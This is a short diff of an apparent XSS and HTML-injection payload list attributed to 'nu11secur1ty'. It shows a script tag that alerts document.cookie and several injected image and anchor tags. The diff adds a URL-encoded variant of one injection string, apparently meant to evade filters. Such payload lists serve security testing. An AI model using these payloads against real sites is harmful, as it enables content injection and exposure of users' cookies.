@@ -89,8 +89,10 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```js
 <span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/></span>
 <img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>
+----------------------------------------------------------------------------------------------------------------------------------------------------------
 <a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif" width=150" height="70">
 <a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif">
+%3c%61%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6e%75%31%31%73%65%63%75%72%31%74%79%2e%63%6f%6d%2f%22%3e%3c%69%6d%67%20%73%72%63%3d%68%74%74%70%73%3a%2f%2f%63%64%6e%35%2d%63%61%70%72%69%6f%66%69%6c%65%73%2e%6e%65%74%64%6e%61%2d%73%73%6c%2e%63%6f%6d%2f%77%70%2d%63%6f%6e%74%65%6e%74%2f%75%70%6c%6f%61%64%73%2f%32%30%31%37%2f%30%37%2f%49%4d%47%5f%30%30%36%38%2e%67%69%66%22%3e%0a%0a
 ```
 ## Error check
 ```
